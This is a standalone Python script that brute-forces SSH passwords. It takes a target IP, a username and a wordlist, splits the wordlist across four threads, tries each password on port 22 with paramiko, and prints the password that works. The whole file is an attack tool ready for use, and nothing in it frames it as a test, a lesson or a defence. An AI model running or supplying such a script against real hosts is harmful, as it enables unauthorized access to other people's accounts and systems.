import paramiko
import threading

target = input('Please enter target IP address: ')
username = input('Please enter username to bruteforce: ')
password_file = input('Please enter location of the password file: ')

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

def bruteforce_passwords(passwords):
    for password in passwords:
        try:
            response = ssh_connect(password)

            if response == 0:
                print('Password found: ' + password)
                return
            elif response == 1:
                print('No luck with password: ' + password)
        except Exception as e:
            print(e)

if __name__ == "__main__":
    with open(password_file, 'r') as file:
        passwords = [line.strip() for line in file.readlines()]

    num_threads = 4  # Adjust the number of threads as needed
    password_chunks = [passwords[i:i + len(passwords) // num_threads] for i in range(0, len(passwords), len(passwords) // num_threads)]

    threads = []
    for chunk in password_chunks:
        thread = threading.Thread(target=bruteforce_passwords, args=(chunk,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print('Bruteforce completed.')